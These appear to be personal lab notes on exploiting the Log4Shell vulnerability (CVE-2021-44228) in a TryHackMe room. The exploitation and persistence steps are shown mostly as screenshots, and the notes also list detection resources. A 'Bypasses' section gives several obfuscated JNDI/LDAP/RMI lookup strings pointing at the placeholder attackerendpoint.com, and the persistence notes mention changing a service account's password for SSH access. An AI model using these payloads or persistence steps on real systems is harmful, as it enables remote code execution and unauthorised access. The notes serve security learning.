## Overview
On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package `**log4j**`. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this `**log4j**` version. This attack has been dubbed "Log4Shell"

## Recon
![[Pasted image 20220119080026.png]]

## Exploitation
Sending the payload after setting up LDAP NCAT and HTTP servers
![[Pasted image 20220128050158.png]]
![[Pasted image 20220128050219.png]]
![[Pasted image 20220128050233.png]]
![[Pasted image 20220128050255.png]]

## Persistence
[[Shell Stabilization]]
![[Pasted image 20220128052223.png]]
![[Pasted image 20220128052241.png]]

Check for root permissions using sudo -l and then change passwd of solr for ssh
![[Pasted image 20220128052820.png]]


## Detection

Below are snippets that might help either effort:

-   [https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes) (local, based off hashes of log4j JAR files)
-   [https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d](https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d) (local, based off hashes of log4j CLASS files)
-   [https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228](https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228) (listing of vulnerable JAR and CLASS hashes)
-   [https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1](https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1) (local, hunting for vulnerable log4j packages in PowerShell)
-   [https://github.com/darkarnium/CVE-2021-44228](https://github.com/darkarnium/CVE-2021-44228) (local, YARA rules)

As a reminder, a massive resource is available here: 

[https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)

## Bypasses

**${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}**

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

**${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}**

**${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}**

**${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}**

**${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}**

**${${::-j}ndi:rmi://attackerendpoint.com/}**

[https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/](https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/)





## References
- [https://github.com/YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)
-   [https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java)
-   [https://log4shell.huntress.com/](https://log4shell.huntress.com/)
-   [https://www.youtube.com/watch?v=7qoPDq41xhQ](https://www.youtube.com/watch?v=7qoPDq41xhQ)
-   https://tryhackme.com/room/solar